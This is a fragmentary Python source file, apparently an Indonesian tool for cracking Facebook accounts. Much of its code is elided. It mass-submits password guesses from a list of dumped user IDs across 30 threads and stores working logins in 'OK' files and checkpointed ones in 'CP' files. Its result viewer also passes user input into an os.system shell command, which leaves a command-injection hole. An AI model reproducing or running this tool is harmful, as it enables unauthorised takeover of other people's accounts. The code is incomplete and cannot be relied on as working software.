...
"""%(N))                                                    
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Nama     	   : DEVI
 [\x1b[1;96m+%s] Facebook     : https://www.facebook.com/profile.php?id=100036118653131
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
def kontol():
    os.system("clear")
    print(f""" 
...
def menu():
	...
	sol().print(fx)
	#print(x+'['+h+'•'+x+'] \033[0;34mDEVI : '+str(my_name))
	#print(x+'['+h+'•'+x+'] \033[0;34mID DEVI   : '+str(my_id))
...
def result():
	...
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
			...
			back()
		if len(vin)==0:
			haha = '# DEVI BELUM MEMILIKI RESULT CP'
		...
		try:vin = os.listdir('OK')
			...
			back()
		if len(vin)==0:
			haha = '# DEVI BELUM MEMILIKI RESULT OK'
			sol().print(mark(haha, style='yellow'))
			time.sleep(2)
			back()
		else:
			...
			for isi in vin:
				...
				if cih<100:
					...
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' ---> '+str(len(hem))+' devi'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' ---> '+str(len(hem))+' devi'+x)
			gerr2 = '# PILIH RESULT UNTUK DITAMPILKAN'
			sol().print(mark(gerr2, style='green'))
			geeh = input(x+'['+p+'f'+x+'] Pilih : ')
			try:geh = lol[geeh]
			...
			try:lin = open('OK/'+geh,'r').read()
				...
				time.sleep(2)
				back()
			devi = '# LIST DEVI OK DEVI'
			sol().print(mark(akun, style='green'))
			hus = os.system('cd OK && cat '+geh)
			devi2 = '# LIST DEVI OK DEVI'
			sol().print(mark(akun, style='green'))
			input(x+'['+h+'•'+x+'] Kembali')
			back()
	elif kz in ['0','00']:
...
def file():
	...
	if len(my_files)==0:
		yy = '# DEVI BELUM MEMILIKI RESULT UNTUK DICEK'
...
def dump_massal():
	...
	try:
		...
		pesan = '# INPUT YANG DEVI MASUKKAN BUKAN ANGKA'
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			if 'mobile' in method:
				...
				pool.submit(crack,idf,pwv)
	print('')
	tanya = '# INGIN MENGECEK OPSI DEVI CRACK?'
	sol().print(mark(tanya, style='cyan'))
	woi = input(x+'['+p+'f'+x+'] Ingin Menampilkan Opsi DEVI Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s [Devi] %s/%s •_• [OK] %s •_• [CP] %s •_• %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def uas(__Aang__Sayang__Laura__):
	if __Aang__Sayang__Laura__ == '':
		...
		if ua in(""):
			...
			print ("\n%s[%s✓%s]  DEVI menggunakan user agent script "%(P,H,P));jeda(2)
			pilihan().menu()
		open("ua.txt","w").write(ua);time.sleep(2)
		print ("\n%s[%s✓%s] DEVI mengganti user agent"%(P,H,P));time.sleep(2)
		menu()
